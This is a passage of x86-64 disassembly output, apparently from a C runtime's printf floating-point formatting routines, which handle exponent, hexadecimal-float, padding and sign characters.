  40636d:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
  406374:	4c 89 da             	mov    %r11,%rdx
  406377:	49 89 d9             	mov    %rbx,%r9
  40637a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  406380:	e8 0b fc ff ff       	call   0x405f90
  406385:	8b 4b 08             	mov    0x8(%rbx),%ecx
  406388:	8b 43 2c             	mov    0x2c(%rbx),%eax
  40638b:	48 89 da             	mov    %rbx,%rdx
  40638e:	83 c7 01             	add    $0x1,%edi
  406391:	89 43 10             	mov    %eax,0x10(%rbx)
  406394:	89 c8                	mov    %ecx,%eax
  406396:	83 e1 20             	and    $0x20,%ecx
  406399:	0d c0 01 00 00       	or     $0x1c0,%eax
  40639e:	83 c9 45             	or     $0x45,%ecx
  4063a1:	89 43 08             	mov    %eax,0x8(%rbx)
  4063a4:	e8 77 f2 ff ff       	call   0x405620
  4063a9:	01 7b 0c             	add    %edi,0xc(%rbx)
  4063ac:	48 89 da             	mov    %rbx,%rdx
  4063af:	48 89 f1             	mov    %rsi,%rcx
  4063b2:	e8 19 f5 ff ff       	call   0x4058d0
  4063b7:	90                   	nop
  4063b8:	48 83 c4 20          	add    $0x20,%rsp
  4063bc:	5b                   	pop    %rbx
  4063bd:	5e                   	pop    %rsi
  4063be:	5f                   	pop    %rdi
  4063bf:	c3                   	ret
  4063c0:	29 c2                	sub    %eax,%edx
  4063c2:	89 53 0c             	mov    %edx,0xc(%rbx)
  4063c5:	eb ad                	jmp    0x406374
  4063c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4063ce:	00 00 
  4063d0:	56                   	push   %rsi
  4063d1:	53                   	push   %rbx
  4063d2:	48 83 ec 68          	sub    $0x68,%rsp
  4063d6:	44 8b 42 10          	mov    0x10(%rdx),%r8d
  4063da:	db 29                	fldt   (%rcx)
  4063dc:	48 89 d3             	mov    %rdx,%rbx
  4063df:	45 85 c0             	test   %r8d,%r8d
  4063e2:	0f 88 98 00 00 00    	js     0x406480
  4063e8:	db 7c 24 50          	fstpt  0x50(%rsp)
  4063ec:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
  4063f1:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
  4063f6:	b9 03 00 00 00       	mov    $0x3,%ecx
  4063fb:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
  406400:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  406405:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
  40640a:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  40640f:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
  406414:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  406419:	e8 32 f1 ff ff       	call   0x405550
  40641e:	44 8b 44 24 4c       	mov    0x4c(%rsp),%r8d
  406423:	48 89 c6             	mov    %rax,%rsi
  406426:	41 81 f8 00 80 ff ff 	cmp    $0xffff8000,%r8d
  40642d:	74 63                	je     0x406492
  40642f:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
  406433:	48 89 c2             	mov    %rax,%rdx
  406436:	49 89 d9             	mov    %rbx,%r9
  406439:	e8 52 fb ff ff       	call   0x405f90
  40643e:	8b 43 0c             	mov    0xc(%rbx),%eax
  406441:	8d 50 ff             	lea    -0x1(%rax),%edx
  406444:	85 c0                	test   %eax,%eax
  406446:	89 53 0c             	mov    %edx,0xc(%rbx)
  406449:	7e 23                	jle    0x40646e
  40644b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  406450:	48 89 da             	mov    %rbx,%rdx
  406453:	b9 20 00 00 00       	mov    $0x20,%ecx
  406458:	e8 c3 f1 ff ff       	call   0x405620
  40645d:	44 8b 43 0c          	mov    0xc(%rbx),%r8d
  406461:	45 8d 48 ff          	lea    -0x1(%r8),%r9d
  406465:	45 85 c0             	test   %r8d,%r8d
  406468:	44 89 4b 0c          	mov    %r9d,0xc(%rbx)
  40646c:	7f e2                	jg     0x406450
  40646e:	48 89 f1             	mov    %rsi,%rcx
  406471:	e8 ba 2b 00 00       	call   0x409030
  406476:	90                   	nop
  406477:	48 83 c4 68          	add    $0x68,%rsp
  40647b:	5b                   	pop    %rbx
  40647c:	5e                   	pop    %rsi
  40647d:	c3                   	ret
  40647e:	66 90                	xchg   %ax,%ax
  406480:	c7 42 10 06 00 00 00 	movl   $0x6,0x10(%rdx)
  406487:	41 b8 06 00 00 00    	mov    $0x6,%r8d
  40648d:	e9 56 ff ff ff       	jmp    0x4063e8
  406492:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
  406496:	49 89 d8             	mov    %rbx,%r8
  406499:	48 89 c2             	mov    %rax,%rdx
  40649c:	e8 8f f3 ff ff       	call   0x405830
  4064a1:	48 89 f1             	mov    %rsi,%rcx
  4064a4:	e8 87 2b 00 00       	call   0x409030
  4064a9:	90                   	nop
  4064aa:	48 83 c4 68          	add    $0x68,%rsp
  4064ae:	5b                   	pop    %rbx
  4064af:	5e                   	pop    %rsi
  4064b0:	c3                   	ret
  4064b1:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  4064b8:	0f 1f 84 00 00 00 00 
  4064bf:	00 
  4064c0:	56                   	push   %rsi
  4064c1:	53                   	push   %rbx
  4064c2:	48 83 ec 78          	sub    $0x78,%rsp
  4064c6:	44 8b 42 10          	mov    0x10(%rdx),%r8d
  4064ca:	db 29                	fldt   (%rcx)
  4064cc:	48 89 d3             	mov    %rdx,%rbx
  4064cf:	41 83 f8 00          	cmp    $0x0,%r8d
  4064d3:	0f 8c 37 01 00 00    	jl     0x406610
  4064d9:	0f 84 11 01 00 00    	je     0x4065f0
  4064df:	db 7c 24 60          	fstpt  0x60(%rsp)
  4064e3:	4c 8d 4c 24 5c       	lea    0x5c(%rsp),%r9
  4064e8:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
  4064ed:	b9 02 00 00 00       	mov    $0x2,%ecx
  4064f2:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
  4064f7:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
  4064fc:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
  406501:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
  406506:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
  40650b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  406510:	e8 3b f0 ff ff       	call   0x405550
  406515:	44 8b 44 24 5c       	mov    0x5c(%rsp),%r8d
  40651a:	48 89 c6             	mov    %rax,%rsi
  40651d:	41 81 f8 00 80 ff ff 	cmp    $0xffff8000,%r8d
  406524:	0f 84 06 01 00 00    	je     0x406630
  40652a:	41 83 f8 fd          	cmp    $0xfffffffd,%r8d
  40652e:	0f 8c 7c 00 00 00    	jl     0x4065b0
  406534:	8b 43 10             	mov    0x10(%rbx),%eax
  406537:	41 39 c0             	cmp    %eax,%r8d
  40653a:	7f 74                	jg     0x4065b0
  40653c:	f6 43 09 08          	testb  $0x8,0x9(%rbx)
  406540:	0f 85 dc 00 00 00    	jne    0x406622
  406546:	48 89 f1             	mov    %rsi,%rcx
  406549:	44 89 44 24 38       	mov    %r8d,0x38(%rsp)
  40654e:	e8 25 3a 00 00       	call   0x409f78
  406553:	44 8b 44 24 38       	mov    0x38(%rsp),%r8d
  406558:	44 29 c0             	sub    %r8d,%eax
  40655b:	85 c0                	test   %eax,%eax
  40655d:	89 43 10             	mov    %eax,0x10(%rbx)
  406560:	0f 88 db 00 00 00    	js     0x406641
  406566:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
  40656a:	48 89 f2             	mov    %rsi,%rdx
  40656d:	49 89 d9             	mov    %rbx,%r9
  406570:	e8 1b fa ff ff       	call   0x405f90
  406575:	8b 43 0c             	mov    0xc(%rbx),%eax
  406578:	8d 50 ff             	lea    -0x1(%rax),%edx
  40657b:	85 c0                	test   %eax,%eax
  40657d:	89 53 0c             	mov    %edx,0xc(%rbx)
  406580:	7e 5b                	jle    0x4065dd
  406582:	48 89 da             	mov    %rbx,%rdx
  406585:	b9 20 00 00 00       	mov    $0x20,%ecx
  40658a:	e8 91 f0 ff ff       	call   0x405620
  40658f:	44 8b 43 0c          	mov    0xc(%rbx),%r8d
  406593:	45 8d 48 ff          	lea    -0x1(%r8),%r9d
  406597:	45 85 c0             	test   %r8d,%r8d
  40659a:	44 89 4b 0c          	mov    %r9d,0xc(%rbx)
  40659e:	7f e2                	jg     0x406582
  4065a0:	48 89 f1             	mov    %rsi,%rcx
  4065a3:	e8 88 2a 00 00       	call   0x409030
  4065a8:	90                   	nop
  4065a9:	48 83 c4 78          	add    $0x78,%rsp
  4065ad:	5b                   	pop    %rbx
  4065ae:	5e                   	pop    %rsi
  4065af:	c3                   	ret
  4065b0:	f6 43 09 08          	testb  $0x8,0x9(%rbx)
  4065b4:	75 4c                	jne    0x406602
  4065b6:	48 89 f1             	mov    %rsi,%rcx
  4065b9:	44 89 44 24 38       	mov    %r8d,0x38(%rsp)
  4065be:	e8 b5 39 00 00       	call   0x409f78
  4065c3:	44 8b 44 24 38       	mov    0x38(%rsp),%r8d
  4065c8:	83 e8 01             	sub    $0x1,%eax
  4065cb:	89 43 10             	mov    %eax,0x10(%rbx)
  4065ce:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
  4065d2:	49 89 d9             	mov    %rbx,%r9
  4065d5:	48 89 f2             	mov    %rsi,%rdx
  4065d8:	e8 23 fd ff ff       	call   0x406300
  4065dd:	48 89 f1             	mov    %rsi,%rcx
  4065e0:	e8 4b 2a 00 00       	call   0x409030
  4065e5:	90                   	nop
  4065e6:	48 83 c4 78          	add    $0x78,%rsp
  4065ea:	5b                   	pop    %rbx
  4065eb:	5e                   	pop    %rsi
  4065ec:	c3                   	ret
  4065ed:	0f 1f 00             	nopl   (%rax)
  4065f0:	c7 42 10 01 00 00 00 	movl   $0x1,0x10(%rdx)
  4065f7:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  4065fd:	e9 dd fe ff ff       	jmp    0x4064df
  406602:	83 6b 10 01          	subl   $0x1,0x10(%rbx)
  406606:	eb c6                	jmp    0x4065ce
  406608:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40660f:	00 
  406610:	c7 42 10 06 00 00 00 	movl   $0x6,0x10(%rdx)
  406617:	41 b8 06 00 00 00    	mov    $0x6,%r8d
  40661d:	e9 bd fe ff ff       	jmp    0x4064df
  406622:	44 29 c0             	sub    %r8d,%eax
  406625:	89 43 10             	mov    %eax,0x10(%rbx)
  406628:	e9 39 ff ff ff       	jmp    0x406566
  40662d:	0f 1f 00             	nopl   (%rax)
  406630:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
  406634:	49 89 d8             	mov    %rbx,%r8
  406637:	48 89 c2             	mov    %rax,%rdx
  40663a:	e8 f1 f1 ff ff       	call   0x405830
  40663f:	eb 9c                	jmp    0x4065dd
  406641:	8b 53 0c             	mov    0xc(%rbx),%edx
  406644:	85 d2                	test   %edx,%edx
  406646:	0f 8e 1a ff ff ff    	jle    0x406566
  40664c:	01 d0                	add    %edx,%eax
  40664e:	89 43 0c             	mov    %eax,0xc(%rbx)
  406651:	e9 10 ff ff ff       	jmp    0x406566
  406656:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40665d:	00 00 00 
  406660:	41 55                	push   %r13
  406662:	41 54                	push   %r12
  406664:	55                   	push   %rbp
  406665:	57                   	push   %rdi
  406666:	56                   	push   %rsi
  406667:	53                   	push   %rbx
  406668:	48 83 ec 68          	sub    $0x68,%rsp
  40666c:	db 29                	fldt   (%rcx)
  40666e:	48 89 d3             	mov    %rdx,%rbx
  406671:	d9 c0                	fld    %st(0)
  406673:	db 7c 24 30          	fstpt  0x30(%rsp)
  406677:	d9 e5                	fxam
  406679:	9b df e0             	fstsw  %ax
  40667c:	66 25 00 45          	and    $0x4500,%ax
  406680:	66 3d 00 01          	cmp    $0x100,%ax
  406684:	0f 84 9e 03 00 00    	je     0x406a28
  40668a:	0f b7 7c 24 38       	movzwl 0x38(%rsp),%edi
  40668f:	89 f9                	mov    %edi,%ecx
  406691:	81 e1 00 80 00 00    	and    $0x8000,%ecx
  406697:	0f 85 23 01 00 00    	jne    0x4067c0
  40669d:	d9 e5                	fxam
  40669f:	9b df e0             	fstsw  %ax
  4066a2:	dd d8                	fstp   %st(0)
  4066a4:	66 25 00 45          	and    $0x4500,%ax
  4066a8:	66 3d 00 05          	cmp    $0x500,%ax
  4066ac:	0f 84 8e 03 00 00    	je     0x406a40
  4066b2:	66 81 e7 ff 7f       	and    $0x7fff,%di
  4066b7:	0f 84 13 01 00 00    	je     0x4067d0
  4066bd:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
  4066c2:	66 81 ef ff 3f       	sub    $0x3fff,%di
  4066c7:	8b 53 10             	mov    0x10(%rbx),%edx
  4066ca:	83 fa 0e             	cmp    $0xe,%edx
  4066cd:	77 39                	ja     0x406708
  4066cf:	48 85 c0             	test   %rax,%rax
  4066d2:	78 05                	js     0x4066d9
  4066d4:	48 01 c0             	add    %rax,%rax
  4066d7:	79 fb                	jns    0x4066d4
  4066d9:	b9 0e 00 00 00       	mov    $0xe,%ecx
  4066de:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  4066e4:	48 d1 e8             	shr    $1,%rax
  4066e7:	29 d1                	sub    %edx,%ecx
  4066e9:	c1 e1 02             	shl    $0x2,%ecx
  4066ec:	49 d3 e0             	shl    %cl,%r8
  4066ef:	4c 01 c0             	add    %r8,%rax
  4066f2:	0f 88 28 03 00 00    	js     0x406a20
  4066f8:	48 01 c0             	add    %rax,%rax
  4066fb:	b9 0f 00 00 00       	mov    $0xf,%ecx
  406700:	29 d1                	sub    %edx,%ecx
  406702:	c1 e1 02             	shl    $0x2,%ecx
  406705:	48 d3 e8             	shr    %cl,%rax
  406708:	48 85 c0             	test   %rax,%rax
  40670b:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
  406710:	0f 84 3e 03 00 00    	je     0x406a54
  406716:	44 8b 4b 08          	mov    0x8(%rbx),%r9d
  40671a:	48 89 ee             	mov    %rbp,%rsi
  40671d:	45 89 cb             	mov    %r9d,%r11d
  406720:	45 89 ca             	mov    %r9d,%r10d
  406723:	41 81 e3 00 08 00 00 	and    $0x800,%r11d
  40672a:	41 83 e2 20          	and    $0x20,%r10d
  40672e:	eb 31                	jmp    0x406761
  406730:	8b 53 10             	mov    0x10(%rbx),%edx
  406733:	85 d2                	test   %edx,%edx
  406735:	7e 06                	jle    0x40673d
  406737:	83 ea 01             	sub    $0x1,%edx
  40673a:	89 53 10             	mov    %edx,0x10(%rbx)
  40673d:	48 c1 e8 04          	shr    $0x4,%rax
  406741:	85 c9                	test   %ecx,%ecx
  406743:	74 62                	je     0x4067a7
  406745:	83 f9 09             	cmp    $0x9,%ecx
  406748:	7e 6b                	jle    0x4067b5
  40674a:	41 83 c0 37          	add    $0x37,%r8d
  40674e:	45 09 d0             	or     %r10d,%r8d
  406751:	44 88 06             	mov    %r8b,(%rsi)
  406754:	48 83 c6 01          	add    $0x1,%rsi
  406758:	48 85 c0             	test   %rax,%rax
  40675b:	0f 84 9f 00 00 00    	je     0x406800
  406761:	49 89 c0             	mov    %rax,%r8
  406764:	41 83 e0 0f          	and    $0xf,%r8d
  406768:	41 39 c0             	cmp    %eax,%r8d
  40676b:	44 89 c1             	mov    %r8d,%ecx
  40676e:	75 c0                	jne    0x406730
  406770:	48 39 ee             	cmp    %rbp,%rsi
  406773:	77 0e                	ja     0x406783
  406775:	45 85 db             	test   %r11d,%r11d
  406778:	75 09                	jne    0x406783
  40677a:	44 8b 6b 10          	mov    0x10(%rbx),%r13d
  40677e:	45 85 ed             	test   %r13d,%r13d
  406781:	7e 07                	jle    0x40678a
  406783:	c6 06 2e             	movb   $0x2e,(%rsi)
  406786:	48 83 c6 01          	add    $0x1,%rsi
  40678a:	48 83 f8 01          	cmp    $0x1,%rax
  40678e:	76 11                	jbe    0x4067a1
  406790:	8d 57 ff             	lea    -0x1(%rdi),%edx
  406793:	48 d1 e8             	shr    $1,%rax
  406796:	89 d7                	mov    %edx,%edi
  406798:	48 83 f8 01          	cmp    $0x1,%rax
  40679c:	8d 57 ff             	lea    -0x1(%rdi),%edx
  40679f:	77 f2                	ja     0x406793
  4067a1:	31 c0                	xor    %eax,%eax
  4067a3:	85 c9                	test   %ecx,%ecx
  4067a5:	75 9e                	jne    0x406745
  4067a7:	48 39 ee             	cmp    %rbp,%rsi
  4067aa:	77 09                	ja     0x4067b5
  4067ac:	44 8b 63 10          	mov    0x10(%rbx),%r12d
  4067b0:	45 85 e4             	test   %r12d,%r12d
  4067b3:	78 a3                	js     0x406758
  4067b5:	41 83 c0 30          	add    $0x30,%r8d
  4067b9:	eb 96                	jmp    0x406751
  4067bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4067c0:	81 4a 08 80 00 00 00 	orl    $0x80,0x8(%rdx)
  4067c7:	e9 d1 fe ff ff       	jmp    0x40669d
  4067cc:	0f 1f 40 00          	nopl   0x0(%rax)
  4067d0:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
  4067d5:	31 ff                	xor    %edi,%edi
  4067d7:	48 83 f8 00          	cmp    $0x0,%rax
  4067db:	0f 84 e6 fe ff ff    	je     0x4066c7
  4067e1:	bf 02 c0 ff ff       	mov    $0xffffc002,%edi
  4067e6:	0f 8c db fe ff ff    	jl     0x4066c7
  4067ec:	ba 01 c0 ff ff       	mov    $0xffffc001,%edx
  4067f1:	89 d7                	mov    %edx,%edi
  4067f3:	83 ea 01             	sub    $0x1,%edx
  4067f6:	48 01 c0             	add    %rax,%rax
  4067f9:	79 f6                	jns    0x4067f1
  4067fb:	e9 c7 fe ff ff       	jmp    0x4066c7
  406800:	48 39 ee             	cmp    %rbp,%rsi
  406803:	0f 84 6b 02 00 00    	je     0x406a74
  406809:	45 89 ca             	mov    %r9d,%r10d
  40680c:	44 8b 5b 0c          	mov    0xc(%rbx),%r11d
  406810:	41 bc 02 00 00 00    	mov    $0x2,%r12d
  406816:	45 85 db             	test   %r11d,%r11d
  406819:	0f 8e a3 00 00 00    	jle    0x4068c2
  40681f:	8b 43 10             	mov    0x10(%rbx),%eax
  406822:	89 f2                	mov    %esi,%edx
  406824:	44 0f bf ef          	movswl %di,%r13d
  406828:	29 ea                	sub    %ebp,%edx
  40682a:	8d 0c 02             	lea    (%rdx,%rax,1),%ecx
  40682d:	85 c0                	test   %eax,%eax
  40682f:	44 89 c8             	mov    %r9d,%eax
  406832:	0f 4f d1             	cmovg  %ecx,%edx
  406835:	25 c0 01 00 00       	and    $0x1c0,%eax
  40683a:	83 f8 01             	cmp    $0x1,%eax
  40683d:	19 c0                	sbb    %eax,%eax
  40683f:	44 8d 44 02 06       	lea    0x6(%rdx,%rax,1),%r8d
  406844:	44 89 e8             	mov    %r13d,%eax
  406847:	ba 67 66 66 66       	mov    $0x66666667,%edx
  40684c:	f7 ea                	imul   %edx
  40684e:	41 c1 fd 1f          	sar    $0x1f,%r13d
  406852:	c1 fa 02             	sar    $0x2,%edx
  406855:	89 d1                	mov    %edx,%ecx
  406857:	44 29 e9             	sub    %r13d,%ecx
  40685a:	74 23                	je     0x40687f
  40685c:	41 bd 67 66 66 66    	mov    $0x66666667,%r13d
  406862:	89 c8                	mov    %ecx,%eax
  406864:	c1 f9 1f             	sar    $0x1f,%ecx
  406867:	41 83 c0 01          	add    $0x1,%r8d
  40686b:	41 f7 ed             	imul   %r13d
  40686e:	41 83 c4 01          	add    $0x1,%r12d
  406872:	c1 fa 02             	sar    $0x2,%edx
  406875:	29 ca                	sub    %ecx,%edx
  406877:	89 d1                	mov    %edx,%ecx
  406879:	75 e7                	jne    0x406862
  40687b:	45 0f bf e4          	movswl %r12w,%r12d
  40687f:	45 39 c3             	cmp    %r8d,%r11d
  406882:	0f 8e 48 01 00 00    	jle    0x4069d0
  406888:	45 29 c3             	sub    %r8d,%r11d
  40688b:	41 81 e1 00 06 00 00 	and    $0x600,%r9d
  406892:	0f 85 5b 01 00 00    	jne    0x4069f3
  406898:	41 8d 43 ff          	lea    -0x1(%r11),%eax
  40689c:	45 85 db             	test   %r11d,%r11d
  40689f:	89 43 0c             	mov    %eax,0xc(%rbx)
  4068a2:	7e 1e                	jle    0x4068c2
  4068a4:	48 89 da             	mov    %rbx,%rdx
  4068a7:	b9 20 00 00 00       	mov    $0x20,%ecx
  4068ac:	e8 6f ed ff ff       	call   0x405620
  4068b1:	8b 43 0c             	mov    0xc(%rbx),%eax
  4068b4:	8d 50 ff             	lea    -0x1(%rax),%edx
  4068b7:	85 c0                	test   %eax,%eax
  4068b9:	89 53 0c             	mov    %edx,0xc(%rbx)
  4068bc:	7f e6                	jg     0x4068a4
  4068be:	44 8b 53 08          	mov    0x8(%rbx),%r10d
  4068c2:	41 f6 c2 80          	test   $0x80,%r10b
  4068c6:	0f 85 15 01 00 00    	jne    0x4069e1
  4068cc:	41 f7 c2 00 01 00 00 	test   $0x100,%r10d
  4068d3:	0f 85 23 01 00 00    	jne    0x4069fc
  4068d9:	41 83 e2 40          	and    $0x40,%r10d
  4068dd:	0f 85 2b 01 00 00    	jne    0x406a0e
  4068e3:	48 89 da             	mov    %rbx,%rdx
  4068e6:	b9 30 00 00 00       	mov    $0x30,%ecx
  4068eb:	e8 30 ed ff ff       	call   0x405620
  4068f0:	8b 4b 08             	mov    0x8(%rbx),%ecx
  4068f3:	48 89 da             	mov    %rbx,%rdx
  4068f6:	83 e1 20             	and    $0x20,%ecx
  4068f9:	83 c9 58             	or     $0x58,%ecx
  4068fc:	e8 1f ed ff ff       	call   0x405620
  406901:	8b 43 0c             	mov    0xc(%rbx),%eax
  406904:	85 c0                	test   %eax,%eax
  406906:	7e 26                	jle    0x40692e
  406908:	f6 43 09 02          	testb  $0x2,0x9(%rbx)
  40690c:	74 20                	je     0x40692e
  40690e:	83 e8 01             	sub    $0x1,%eax
  406911:	89 43 0c             	mov    %eax,0xc(%rbx)
  406914:	48 89 da             	mov    %rbx,%rdx
  406917:	b9 30 00 00 00       	mov    $0x30,%ecx
  40691c:	e8 ff ec ff ff       	call   0x405620
  406921:	8b 43 0c             	mov    0xc(%rbx),%eax
  406924:	8d 50 ff             	lea    -0x1(%rax),%edx
  406927:	85 c0                	test   %eax,%eax
  406929:	89 53 0c             	mov    %edx,0xc(%rbx)
  40692c:	7f e6                	jg     0x406914
  40692e:	48 39 ee             	cmp    %rbp,%rsi
  406931:	77 27                	ja     0x40695a
  406933:	eb 4d                	jmp    0x406982
  406935:	0f b7 43 20          	movzwl 0x20(%rbx),%eax
  406939:	66 85 c0             	test   %ax,%ax
  40693c:	66 89 44 24 2e       	mov    %ax,0x2e(%rsp)
  406941:	74 12                	je     0x406955
  406943:	48 8d 4c 24 2e       	lea    0x2e(%rsp),%rcx
  406948:	49 89 d8             	mov    %rbx,%r8
  40694b:	ba 01 00 00 00       	mov    $0x1,%edx
  406950:	e8 2b ed ff ff       	call   0x405680
  406955:	48 39 ee             	cmp    %rbp,%rsi
  406958:	74 28                	je     0x406982
  40695a:	48 83 ee 01          	sub    $0x1,%rsi
  40695e:	0f be 0e             	movsbl (%rsi),%ecx
  406961:	83 f9 2e             	cmp    $0x2e,%ecx
  406964:	74 5f                	je     0x4069c5
  406966:	83 f9 2c             	cmp    $0x2c,%ecx
  406969:	74 ca                	je     0x406935
  40696b:	48 89 da             	mov    %rbx,%rdx
  40696e:	e8 ad ec ff ff       	call   0x405620
  406973:	eb e0                	jmp    0x406955
  406975:	48 89 da             	mov    %rbx,%rdx
  406978:	b9 30 00 00 00       	mov    $0x30,%ecx
  40697d:	e8 9e ec ff ff       	call   0x405620
  406982:	8b 43 10             	mov    0x10(%rbx),%eax
  406985:	8d 50 ff             	lea    -0x1(%rax),%edx
  406988:	85 c0                	test   %eax,%eax
  40698a:	89 53 10             	mov    %edx,0x10(%rbx)
  40698d:	7f e6                	jg     0x406975
  40698f:	8b 4b 08             	mov    0x8(%rbx),%ecx
  406992:	48 89 da             	mov    %rbx,%rdx
  406995:	83 e1 20             	and    $0x20,%ecx
  406998:	83 c9 50             	or     $0x50,%ecx
  40699b:	e8 80 ec ff ff       	call   0x405620
  4069a0:	44 01 63 0c          	add    %r12d,0xc(%rbx)
  4069a4:	81 4b 08 c0 01 00 00 	orl    $0x1c0,0x8(%rbx)
  4069ab:	48 0f bf cf          	movswq %di,%rcx
  4069af:	48 89 da             	mov    %rbx,%rdx
  4069b2:	e8 19 ef ff ff       	call   0x4058d0
  4069b7:	90                   	nop
  4069b8:	48 83 c4 68          	add    $0x68,%rsp
  4069bc:	5b                   	pop    %rbx
  4069bd:	5e                   	pop    %rsi
  4069be:	5f                   	pop    %rdi
  4069bf:	5d                   	pop    %rbp
  4069c0:	41 5c                	pop    %r12
  4069c2:	41 5d                	pop    %r13
  4069c4:	c3                   	ret
  4069c5:	48 89 d9             	mov    %rbx,%rcx
  4069c8:	e8 d3 f4 ff ff       	call   0x405ea0
  4069cd:	eb 86                	jmp    0x406955
  4069cf:	90                   	nop
  4069d0:	41 f6 c2 80          	test   $0x80,%r10b
  4069d4:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
  4069db:	0f 84 eb fe ff ff    	je     0x4068cc
  4069e1:	48 89 da             	mov    %rbx,%rdx
  4069e4:	b9 2d 00 00 00       	mov    $0x2d,%ecx
  4069e9:	e8 32 ec ff ff       	call   0x405620
  4069ee:	e9 f0 fe ff ff       	jmp    0x4068e3
  4069f3:	44 89 5b 0c          	mov    %r11d,0xc(%rbx)
  4069f7:	e9 c6 fe ff ff       	jmp    0x4068c2
  4069fc:	48 89 da             	mov    %rbx,%rdx
  4069ff:	b9 2b 00 00 00       	mov    $0x2b,%ecx
  406a04:	e8 17 ec ff ff       	call   0x405620
  406a09:	e9 d5 fe ff ff       	jmp    0x4068e3
  406a0e:	48 89 da             	mov    %rbx,%rdx
  406a11:	b9 20 00 00 00       	mov    $0x20,%ecx
  406a16:	e8 05 ec ff ff       	call   0x405620
  406a1b:	e9 c3 fe ff ff       	jmp    0x4068e3
  406a20:	83 c7 01             	add    $0x1,%edi
  406a23:	e9 d3 fc ff ff       	jmp    0x4066fb
  406a28:	dd d8                	fstp   %st(0)
  406a2a:	49 89 d0             	mov    %rdx,%r8
  406a2d:	48 8d 15 6c 2e 0d 00 	lea    0xd2e6c(%rip),%rdx        # 0x4d98a0
  406a34:	31 c9                	xor    %ecx,%ecx
  406a36:	e8 f5 ed ff ff       	call   0x405830
  406a3b:	e9 78 ff ff ff       	jmp    0x4069b8
  406a40:	48 8d 15 5d 2e 0d 00 	lea    0xd2e5d(%rip),%rdx        # 0x4d98a4
  406a47:	49 89 d8             	mov    %rbx,%r8
  406a4a:	e8 e1 ed ff ff       	call   0x405830
  406a4f:	e9 64 ff ff ff       	jmp    0x4069b8
  406a54:	44 8b 4b 08          	mov    0x8(%rbx),%r9d
  406a58:	85 d2                	test   %edx,%edx
  406a5a:	45 89 ca             	mov    %r9d,%r10d
  406a5d:	7e 1a                	jle    0x406a79
  406a5f:	48 8d 75 01          	lea    0x1(%rbp),%rsi
  406a63:	c6 44 24 40 2e       	movb   $0x2e,0x40(%rsp)
  406a68:	c6 06 30             	movb   $0x30,(%rsi)
  406a6b:	48 83 c6 01          	add    $0x1,%rsi
  406a6f:	e9 98 fd ff ff       	jmp    0x40680c
  406a74:	8b 53 10             	mov    0x10(%rbx),%edx
  406a77:	eb df                	jmp    0x406a58
  406a79:	41 f7 c1 00 08 00 00 	test   $0x800,%r9d
  406a80:	48 89 ee             	mov    %rbp,%rsi
  406a83:	74 e3                	je     0x406a68
  406a85:	eb d8                	jmp    0x406a5f
  406a87:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  406a8e:	00 00 
  406a90:	56                   	push   %rsi
  406a91:	53                   	push   %rbx
  406a92:	48 83 ec 68          	sub    $0x68,%rsp
  406a96:	44 8b 42 10          	mov    0x10(%rdx),%r8d
  406a9a:	db 29                	fldt   (%rcx)
  406a9c:	48 89 d3             	mov    %rdx,%rbx
  406a9f:	45 85 c0             	test   %r8d,%r8d
  406aa2:	78 6c                	js     0x406b10
  406aa4:	41 83 c0 01          	add    $0x1,%r8d
  406aa8:	db 7c 24 50          	fstpt  0x50(%rsp)
  406aac:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
  406ab1:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
  406ab6:	b9 02 00 00 00       	mov    $0x2,%ecx
  406abb:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
  406ac0:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  406ac5:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
  406aca:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  406acf:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
  406ad4:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  406ad9:	e8 72 ea ff ff       	call   0x405550
  406ade:	44 8b 44 24 4c       	mov    0x4c(%rsp),%r8d
  406ae3:	48 89 c6             	mov    %rax,%rsi
  406ae6:	41 81 f8 00 80 ff ff 	cmp    $0xffff8000,%r8d
  406aed:	74 31                	je     0x406b20
  406aef:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
  406af3:	49 89 d9             	mov    %rbx,%r9
  406af6:	48 89 c2             	mov    %rax,%rdx
  406af9:	e8 02 f8 ff ff       	call   0x406300
  406afe:	48 89 f1             	mov    %rsi,%rcx
  406b01:	e8 2a 25 00 00       	call   0x409030
